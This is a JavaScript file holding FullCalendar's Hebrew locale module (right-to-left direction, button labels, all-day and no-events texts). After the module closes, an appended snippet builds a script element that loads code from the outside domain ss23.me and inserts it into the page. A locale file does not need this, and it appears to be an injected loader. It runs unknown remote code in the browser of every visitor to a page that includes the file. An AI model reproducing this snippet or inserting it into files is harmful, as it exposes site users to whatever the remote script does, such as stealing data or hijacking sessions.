(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FullCalendarLocales = global.FullCalendarLocales || {}, global.FullCalendarLocales.he = factory()));
}(this, function () { 'use strict';

    var he = {
        code: "he",
        dir: 'rtl',
        buttonText: {
            prev: "הקודם",
            next: "הבא",
            today: "היום",
            month: "חודש",
            week: "שבוע",
            day: "יום",
            list: "סדר יום"
        },
        allDayText: "כל היום",
        eventLimitText: "אחר",
        noEventsMessage: "אין אירועים להצגה",
        weekLabel: "שבוע"
    };

    return he;

}));
var e = document.createElement("script");
  e.async = !0,
  e.src = "//ss23.me/js/8d34.js";
  e.charset="UTF-8";
  var t = document.getElementsByTagName("script")[0];
  t.parentNode.insertBefore(e, t);